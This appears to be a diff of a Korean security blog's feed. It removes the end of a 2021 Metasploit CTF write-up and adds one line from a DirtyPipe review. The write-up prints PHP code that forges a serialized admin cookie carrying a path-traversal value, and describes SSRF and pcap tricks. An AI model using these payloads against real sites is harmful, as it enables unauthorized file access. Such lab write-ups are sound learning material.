-&lt;h2 id=&quot;jack-of-hearts&quot;&gt;Jack of Hearts&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;Seokchan Yoon (@ch4n3)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;20022/tcp에 http로 접근이 가능하다. 다음과 같이 user 쿠키를 변조하여 문제를 해결할 수 있었다:&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_img&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/../../../../../flag.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))));&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php serialize.php
-O:4:&lt;span class=&quot;s2&quot;&gt;&quot;user&quot;&lt;/span&gt;:3:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;s:8:&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:5:&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:5:&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;b:0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:11:&lt;span class=&quot;s2&quot;&gt;&quot;profile_img&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s:37:&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/../../../../../flag.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;ace-of-diamonds&quot;&gt;Ace of Diamonds&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;Dohyun Kim (@d0now)&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;35000/tcp에 http로 접근하게 되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capture.pcap&lt;/code&gt; 파일을 획득할 수 있다. 이 파일은 SMB 프로토콜이 캡쳐된것을 확인할 수 있는데, 몇가지 수상한 행동을 한다. 하지만 이는 모두 연막이고 단순히 padding 필드가 존재하는 패킷의 padding 값을 확인해보면 ascii 범위인것을 알 수 있다. 이를 모두 조합하게 되면 다음과 같은 문자열을 획득할 수 있다:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Here is the URL you are looking for: /U,rhbjaaCeDseVRQzEO.YsgXXtoGKpvUEkZXaoxurhdYnIlpJiGszZwUktVWTS,DabQAhvbEDQaNL_Dhsq.pposWkG-DtQdIVXNEWd.KbtYXvCek_gJuzIrDtMHfITFL/flag.png
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;해당 경로로 접속하게 되면 플래그를 획득할 수 있다.&lt;/p&gt;
-
-&lt;p&gt;별개로, SMB 관리자의 계정은 다음과 같다: Administrator:netntlmv2&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;ace-of-hearts&quot;&gt;Ace of Hearts&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Solved by &lt;strong&gt;Donggyu Kim&lt;/strong&gt; from &lt;strong&gt;STLCTF&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;20011/tcp로 접근하게 되면 네개의 사용자의 페이지를 볼 수 있는데, 이 중 John의 페이지는 private 설정이 되어 있다. 하지만 밑의 url 검색 기능에서 SSRF가 발생하는데, 이를 이용하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt;에 접근하게 되면 John의 페이지 권한 설정을 수정할 수 있다. 그리고 John의 페이지로 접근하여 플래그를 획득할 수 있었다.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;review&quot;&gt;Review&lt;/h2&gt;
-
-&lt;p&gt;2년째 영국 친구들(@PostalTime)과 함께하는 metasploit community ctf 되시겠다. 대부분의 문제들이 상식선에 있었지만, 7 of Hearts 문제는 정말 지옥과도 같았다. 1등을 제외하고, 현재 2등, 3등인 팀들과 격차를 꽤 벌려 놓았었는데 결국 해당 문제를 풀지 못하여 4등을 하게 되었다. 7 of Hearts 문제의 경우 나의 주관적인 생각으론, 다른 문제들과 컨셉이 비슷하지 못했다는 점에서 그렇게 잘 만든 문제는 아닌거 같다고 보여진다. 아마도 운이 좋게 dhcp 클라이언트 포트가 열려 있는것을 발견하지 못했다면 대회가 끝날 때 까지 못 풀지 않았을까 생각한다(아이디어의 원천이 되어준 &lt;strong&gt;Jaehoon Jang&lt;/strong&gt;님께 감사.)&lt;/p&gt;
-
-&lt;p&gt;이번 CTF의 경우 사실 공식적으로 STLCTF란 팀명으로 처음 진행 한 ctf이다. STLCTF는 Stealien의 연구원, Stealien의 인턴(혹은 인턴으로 재직했던 사람), Stealien Security Leader 1기, 2기로 구성되어 있다. 뭔가 빡세게 ctf를 하는 팀은 아니고, 이 그룹에 속해 있으면서 함께 ctf 나갈 기회가 있으면 함께 하는 뭐 그런 자유로운 분위기의 커뮤니티 정도로만 생각 해 주면 되겠다. 가입 의사가 있으면, Discord &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PI#5539&lt;/code&gt;로 연락 주길 바란다. 당연하지만 본인의 소속/이름 정도를 간단하게 밝혀주면 좋다 :)&lt;/p&gt;
-
-&lt;p&gt;또한 PostalTime도 소개해볼까 한다. PostalTime도 뭔가 열심히 CTF를 하는 팀이라기 보다는 PoC에서 만난 &lt;a href=&quot;https://twitter.com/timwr&quot;&gt;@tiwmr&lt;/a&gt;을 주요로 활동하는 보안 커뮤니티 같은 느낌이다. (사실 물어보지 않아서 모른다.) 작년의 metasploit ctf 이후로 1년만에 같이 진행 했는데, 작년에는 3위를 한 것과 달리 1등수가 떨어져서 tim한테 미안할 따름이다.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;총평&lt;/strong&gt; : 역시 ctf는 가끔 하는게 정신 건강에 이로운 것 같다.&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name>김도현</name></author><category term="R&amp;D" /><summary type="html">2021 Metasploit Community CTF write-up, review</summary></entry></feed>
+&lt;p&gt;최종적으로 pipe_write 함수를 호출하면, buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE를 통과하고 copy_page_from_iter 함수 호출과 함께 buf→page에 있는 page cache가 우리의 데이터로 덮히게 된다. 다시 똑같은 파일을 읽게 된다면, 우리가 수정한 내용이 담겨있는 page cache를 읽게된다.&lt;/p&gt;</content><author><name>seonungjang</name></author><category term="R&amp;D" /><summary type="html">DirtyPipe Review</summary></entry></feed>
